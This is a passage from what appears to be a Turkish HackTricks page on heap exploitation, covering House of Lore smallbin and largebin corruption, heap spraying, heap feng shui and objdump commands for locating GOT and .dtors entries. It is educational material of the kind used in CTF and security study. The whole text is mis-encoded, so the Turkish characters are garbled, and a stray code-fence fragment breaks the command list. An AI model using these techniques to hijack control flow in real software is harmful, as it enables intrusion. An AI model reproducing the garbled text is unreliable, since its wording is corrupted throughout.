Bu ÅŸekilde deÄŸiÅŸtirilmiÅŸ deÄŸer av->top'a kaydedilir ve bir sonraki malloc EIP'ye iÅŸaret eder ve Ã¼zerine yazÄ±labilir.

Yeni wilderness parÃ§asÄ±nÄ±n boyutunun, son malloc() tarafÄ±ndan yapÄ±lan istekten daha bÃ¼yÃ¼k olmasÄ± Ã¶nemlidir. Yani, eÄŸer wilderness \&EIP-8'e iÅŸaret ediyorsa, boyut tam olarak stack'in EBP alanÄ±nda olacaktÄ±r.

**The House of Lore**

**SmallBin BozulmasÄ±**

Serbest bÄ±rakÄ±lan parÃ§alar, boyutlarÄ±na gÃ¶re bir bine yerleÅŸtirilir. Ancak, unsorted bins'e Ã¶nce yerleÅŸtirilirler. Bir parÃ§a serbest bÄ±rakÄ±ldÄ±ÄŸÄ±nda hemen binine konulmaz, unsorted bins'te kalÄ±r. Daha sonra, yeni bir parÃ§a rezerve edilirse ve Ã¶nceki serbest bÄ±rakÄ±lan parÃ§a ona hizmet edebilirse, o parÃ§a geri verilir, ancak daha bÃ¼yÃ¼k bir parÃ§a rezerve edilirse, unsorted bins'teki serbest bÄ±rakÄ±lan parÃ§a uygun binine konulur.

Kodun savunmasÄ±z hale gelmesi iÃ§in bellek isteÄŸi av->max_fast'tan bÃ¼yÃ¼k (genellikle 72) ve MIN_LARGE_SIZE'dan (512) kÃ¼Ã§Ã¼k olmalÄ±dÄ±r.

EÄŸer binde istenilen boyutta bir parÃ§a varsa, bu parÃ§a Ã§Ã¶zÃ¼lÃ¼p geri verilir:

bck = victim->bk; Ã–nceki parÃ§aya iÅŸaret eder, deÄŸiÅŸtirebileceÄŸimiz tek bilgidir.

bin->bk = bck; Ã–nceki parÃ§a son parÃ§a olur, bck stack'e iÅŸaret ediyorsa, bir sonraki rezerve edilen parÃ§aya bu adres verilecektir.

bck->fd = bin; Liste kapatÄ±lÄ±r ve bu bin'e iÅŸaret edilir.

Gerekli olanlar:

Ä°kinci parÃ§anÄ±n serbest bÄ±rakÄ±ldÄ±ktan sonra taÅŸma yapÄ±labilmesi iÃ§in iki malloc rezerve edilmesi gerekmektedir (yani taÅŸma yapmadan Ã¶nce ikinci parÃ§adan daha bÃ¼yÃ¼k bir malloc rezerve edilmiÅŸ olmalÄ±dÄ±r)

SaldÄ±rganÄ±n seÃ§tiÄŸi adrese verilen adresi kontrol edebileceÄŸi bir malloc rezerve edilmelidir.

Hedef ÅŸudur, bir heap'e taÅŸma yapabilirsek ve altÄ±nda serbest bÄ±rakÄ±lmÄ±ÅŸ ve binine konulmuÅŸ bir parÃ§a varsa, bk iÅŸaretÃ§isini deÄŸiÅŸtirebiliriz. Bk iÅŸaretÃ§isini deÄŸiÅŸtirirsek ve bu parÃ§a bin listesinde ilk parÃ§a haline gelirse ve rezerve edilirse, bin yanÄ±ltÄ±lacak ve listenin son parÃ§asÄ±nÄ±n (teklif edilen sonraki parÃ§a) yanlÄ±ÅŸ adreste olduÄŸuna inanacaktÄ±r (Ã¶rneÄŸin stack veya GOT). Bu nedenle, baÅŸka bir parÃ§a rezerve edilirse ve saldÄ±rganÄ±n izinleri varsa, istenen konumda bir parÃ§a alacak ve Ã¼zerine yazabilecektir.

DeÄŸiÅŸtirilmiÅŸ parÃ§anÄ±n serbest bÄ±rakÄ±lmasÄ±ndan sonra serbest bÄ±rakÄ±lan parÃ§adan daha bÃ¼yÃ¼k bir parÃ§a rezerve edilmesi gerekmektedir, bÃ¶ylece deÄŸiÅŸtirilmiÅŸ parÃ§a unsorted bins'ten Ã§Ä±kar ve uygun binine konulur.

Uygun binine konulduÄŸunda, taÅŸma yaparak bk iÅŸaretÃ§isini deÄŸiÅŸtirmenin zamanÄ± gelir, bÃ¶ylece istediÄŸimiz adrese iÅŸaret eder.

Bu saldÄ±rÄ±nÄ±n mÃ¼mkÃ¼n olduÄŸu kadar hÄ±zlÄ± gerÃ§ekleÅŸmesi iÃ§in ideal olan ÅŸudur: SavunmasÄ±z parÃ§anÄ±n rezervasyonu, deÄŸiÅŸtirilecek parÃ§anÄ±n rezervasyonu, bu parÃ§anÄ±n serbest bÄ±rakÄ±lmasÄ±, deÄŸiÅŸtirilecek parÃ§adan daha bÃ¼yÃ¼k bir parÃ§anÄ±n rezervasyonu, parÃ§anÄ±n deÄŸiÅŸtirilmesi (savunmasÄ±zlÄ±k), savunmasÄ±z parÃ§adan aynÄ± boyutta bir parÃ§a ve ikinci bir parÃ§a rezervasyonu yapÄ±lÄ±r ve bu, istenen adrese iÅŸaret eden parÃ§a olacaktÄ±r.

Bu saldÄ±rÄ±yÄ± korumak iÃ§in, parÃ§anÄ±n "sahte olmadÄ±ÄŸÄ±" tipik bir kontrol kullanÄ±lÄ±r: bck->fd'nin victim'a iÅŸaret ettiÄŸi kontrol edilir. Yani, bizim durumumuzda, stack'te iÅŸaret edilen sahte parÃ§anÄ±n fd\* iÅŸaretÃ§isinin victim'a iÅŸaret edip etmediÄŸi kontrol edilir. Bu korumayÄ± aÅŸmak iÃ§in saldÄ±rganÄ±n, stack'te muhtemelen, doÄŸru adrese victim'Ä±n adresini yazabilmesi gerekir. BÃ¶ylece, gerÃ§ek bir parÃ§a gibi gÃ¶rÃ¼nÃ¼r.

**LargeBin BozulmasÄ±**

Ã–nceki gereksinimlerin yanÄ± sÄ±ra, rezerve edilen parÃ§alarÄ±n 512'den bÃ¼yÃ¼k olmasÄ± gerekmektedir.

SaldÄ±rÄ±, Ã¶ncekiyle aynÄ±dÄ±r, yani bk iÅŸaretÃ§isini deÄŸiÅŸtirmek gereklidir ve tÃ¼m bu malloc() Ã§aÄŸrÄ±larÄ±na ihtiyaÃ§ vardÄ±r, ancak ayrÄ±ca deÄŸiÅŸtirilen parÃ§anÄ±n boyutunu deÄŸiÅŸtirmek gerekmektedir, bÃ¶ylece bu boyut - nb < MINSIZE olur.

Ã–rneÄŸin, 1552 boyutunda bir parÃ§a koyarak 1552 - 1544 = 8 < MINSIZE olacak ÅŸekilde boyutu deÄŸiÅŸtiririz (Ã§Ä±karma iÅŸlemi negatif olmamalÄ±dÄ±r Ã§Ã¼nkÃ¼ unsigned karÅŸÄ±laÅŸtÄ±rma yapÄ±lÄ±r).

AyrÄ±ca, iÅŸi daha da karmaÅŸÄ±k hale getirmek iÃ§in bir yama eklenmiÅŸtir.

**Heap Spraying**

Temelde, tÃ¼m mÃ¼mkÃ¼n belleÄŸi heap'ler iÃ§in rezerve etmek ve bunlarÄ± bir shellcode ile biten bir nops yastÄ±ÄŸÄ± ile doldurmaktÄ±r. AyrÄ±ca, yastÄ±k olarak 0x0c kullanÄ±lÄ±r. Yani, 0x0c0c0c0c adresine atlamaya Ã§alÄ±ÅŸÄ±lacak ve bÃ¶ylece bu yastÄ±kla Ã§aÄŸrÄ±lacak bir adrese yazÄ±lÄ±rsa oraya atlanacaktÄ±r. Temel olarak taktik, bir noktaya kadar rezerve etmek ve herhangi bir iÅŸaretÃ§iyi Ã¼zerine yazÄ±p yazmadÄ±ÄŸÄ±nÄ± gÃ¶rmektir ve 0x0c0c0c0c adresine atlamayÄ± ummaktÄ±r.

**Heap Feng Shui**

BelleÄŸi rezerve ederek ve serbest bÄ±rakarak belleÄŸi sementlemek ve serbest parÃ§alar arasÄ±nda rezerve edilmiÅŸ parÃ§alar bÄ±rakmak anlamÄ±na gelir. TaÅŸmaya neden olacak tampon bir yumurtanÄ±n iÃ§ine yerleÅŸtirilir.

**objdump -d executable** â€”> FonksiyonlarÄ± ayrÄ±ÅŸtÄ±rÄ±r\
**objdump -d ./PROGRAMA | grep FUNCTION** â€”> Fonksiyon adresini alÄ±r\
**objdump -d -Mintel ./shellcodeout** â€”> Shellcode'un bizimkisi olduÄŸunu ve OpCodes'leri almak iÃ§in
```
```html
**objdump -t ./exec | grep varBss** â€”> DeÄŸiÅŸkenlerin ve fonksiyonlarÄ±n adreslerini almak iÃ§in sembol tablosu\
**objdump -TR ./exec | grep exit(func lib)** â€”> KÃ¼tÃ¼phane fonksiyonlarÄ±nÄ±n adreslerini almak iÃ§in (GOT)\
**objdump -d ./exec | grep funcCode**\
**objdump -s -j .dtors /exec**\
**objdump -s -j .got ./exec**\
**objdump -t --dynamic-relo ./exec | grep puts** â€”> GOT'ta Ã¼zerine yazÄ±lacak puts adresini alÄ±r\
**objdump -D ./exec** â€”> TÃ¼mÃ¼ne kadar disas\
**objdump -p -/exec**\
**Info functions strncmp â€”>** gdb'de fonksiyon hakkÄ±nda bilgi

## Ä°lginÃ§ Kurslar

* [https://guyinatuxedo.github.io/](https://guyinatuxedo.github.io)
* [https://github.com/RPISEC/MBE](https://github.com/RPISEC/MBE)
* [https://ir0nstone.gitbook.io/notes](https://ir0nstone.gitbook.io/notes)
* [https://github.com/shellphish/how2heap](https://github.com/shellphish/how2heap)
* [https://pwnable.tw/](https://pwnable.tw/)
* [https://ctf.hackucf.org/](https://ctf.hackucf.org/)

## **Referanslar**

* [**https://guyinatuxedo.github.io/7.2-mitigation\_relro/index.html**](https://guyinatuxedo.github.io/7.2-mitigation\_relro/index.html)

<details>

<summary><strong>AWS hacklemeyi sÄ±fÄ±rdan kahraman seviyesine Ã¶ÄŸrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> ile!</strong></summary>

HackTricks'Ä± desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklamÄ±nÄ±zÄ± gÃ¶rmek veya HackTricks'i PDF olarak indirmek istiyorsanÄ±z** [**ABONELÄ°K PLANLARI**](https://github.com/sponsors/carlospolop)'na gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini alÄ±n**](https://peass.creator-spring.com)
* [**The PEASS Family'yi keÅŸfedin**](https://opensea.io/collection/the-peass-family), Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuzu keÅŸfedin
* **ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n veya bizi Twitter'da** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** takip edin.**
* **Hacking pÃ¼f noktalarÄ±nÄ±zÄ± paylaÅŸarak PR gÃ¶ndererek HackTricks ve HackTricks Cloud** github depolarÄ±na katkÄ±da bulunun.

</details>
